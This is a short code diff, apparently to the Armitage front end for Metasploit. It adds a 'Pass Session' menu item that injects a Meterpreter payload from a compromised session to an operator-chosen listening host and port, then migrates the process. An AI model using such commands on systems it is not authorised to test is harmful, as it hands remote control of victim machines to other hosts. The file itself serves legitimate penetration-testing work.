@@ -188,6 +188,15 @@ sub showMeterpreterMenu {
 				}, \$sid));
 			}, \$sid));
 		}, $sid => "$sid"));
+
+		item($j, "Pass Session", 'S', lambda({
+			($host, $port) = split(':', ask("Send session to which listening host:port?"));
+			if ($host ne "" && $port ne "") {
+				oneTimeShow("run");
+				m_cmd($sid, "run multi_meter_inject -mr $host -p $port");
+			}
+			m_cmd($sid, "run migrate -f");
+		}, $sid => "$sid"));
 	}
 			
 	$j = menu($1, "Interact", 'I');
